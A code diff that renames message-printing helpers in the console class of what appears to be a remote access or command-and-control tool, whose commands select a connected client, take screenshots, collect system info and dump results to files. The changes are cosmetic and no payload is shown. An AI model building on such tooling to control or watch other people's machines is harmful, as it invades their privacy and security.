@@ -54,11 +54,11 @@ class COMMCENTER:
                 self.CURRENT = tgt
             else:
                 sys.stdout.write("\n")
-                output.error("No client is associated with that ID!")
+                output.print_red("No client is associated with that ID!")
                 sys.stdout.write("\n")
         else:
             sys.stdout.write("\n")
-            output.error("Invalid Syntax!")
+            output.print_red("Invalid Syntax!")
             sys.stdout.write("\n")
 
     def c_disconnect(self):
@@ -100,7 +100,7 @@ class COMMCENTER:
                         break
         else:
             sys.stdout.write("\n")
-            output.error("You need to connect before execute this command!")
+            output.print_red("You need to connect before execute this command!")
             sys.stdout.write("\n")
 
     def c_clear(self):
@@ -137,14 +137,14 @@ class COMMCENTER:
                     fl = open(fullpath, 'w')
                     fl.write(result)
                     fl.close()
-                    output.success("Dumped: [" + output.GREEN + fullpath + output.END + "]")
+                    output.print_green("Dumped: [" + output.GREEN + fullpath + output.END + "]")
 
                 else:
-                    output.error("Invalid Syntax!")
+                    output.print_red("Invalid Syntax!")
             else:
-                output.error("Invalid Syntax!")
+                output.print_red("Invalid Syntax!")
         else:
-            output.error("You need to connect before execute this command!")
+            output.print_red("You need to connect before execute this command!")
 
     def c_sysinfo(self):
         if self.CURRENT:
@@ -153,7 +153,7 @@ class COMMCENTER:
             if result.strip(" "):
                 print(result)
         else:
-            output.error("You need to connect before execute this command!")
+            output.print_red("You need to connect before execute this command!")
 
     def c_screenshot(self):
         if self.CURRENT:
@@ -170,10 +170,10 @@ class COMMCENTER:
             fl = open(fullpath, 'wb')
             fl.write(result)
             fl.close()
-            output.success("Saved: [" + output.DARKCYAN + fullpath + output.END + "]")
+            output.print_green("Saved: [" + output.DARKCYAN + fullpath + output.END + "]")
         else:
-            output.error("You need to connect before execute this command!")
+            output.print_red("You need to connect before execute this command!")
 
     def c_exit(self):
         sys.stdout.write("\n")
-        output.exit("See Ya!\n")
+        output.print_red("See Ya!\n")
